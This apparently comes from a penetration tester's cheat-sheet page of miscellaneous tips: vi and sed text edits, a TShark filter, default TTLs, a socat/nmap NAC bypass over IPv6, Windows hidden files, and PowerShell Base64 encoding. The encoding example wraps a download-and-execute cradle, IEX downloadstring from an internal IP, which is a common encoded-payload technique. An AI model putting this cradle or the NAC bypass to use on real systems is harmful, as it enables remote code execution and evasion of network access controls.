---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/misc
---

# Misc

## Replace value on vi

```basic
vi test.txt

[Esc] 
:s/ //g  
# search for space :s/ / 
/ replace nothing with space
g for global search for multiple time

[Esc]
:s/ /$/g
# Search for space and replace by $ sign
```

## TShark

```basic
tshark -r file.pcap -Y 'fieldname' -Tfields -e ip.src | sort | uniq -c
```

## TTL

```basic
Window TTL= 128
Linux TTL= 64
```

## Bypass NAC via IPv6 address

```basic
sudo socat tcp-listen:443,reuseaddr,fork TCP6:[fe80-.....]:443
sudo nmap -6 ipv6-address -Pn -nv
```

## Append text to end of line

```basic
sed -i 's/$/ is a great programming language./' text.txt

└─$ cat text.txt   
C
C++
C#
Python
                                                                                                                                                                                             
└─$ sed -i 's/$/ is a great programming language./' text.txt
                                                                                                                                                                                             
└─$ cat text.txt 
C is a great programming language.
C++ is a great programming language.
C# is a great programming language.
Python is a great programming language.
```

## Windows Hidden Files

```powershell
PS C:\Users\redop\Desktop> attrib
A  SH        C:\Users\redop\Desktop\desktop.ini
A   H        C:\Users\redop\Desktop\user.txt


PS C:\Users\redop\Desktop> gci -force

    Directory: C:\Users\redop\Desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-a-h-         5/30/2018  11:32 PM         32 user.txt  
```

## Convert File to Base64 (Powershell)

Strnig

```powershell
# Encode
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/run/txt"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

# Decode
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("base64-string"))
```

File

```powershell
# Encode
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\NOte.txt"))

# Decode
$str = "aGVsbG8gd29ybGQK"
[byte[]]$Bytes = [convert]::FromBase64String($str) 
[System.IO.File]::WriteAllBytes("/home/kali/note.txt",$Bytes)
```
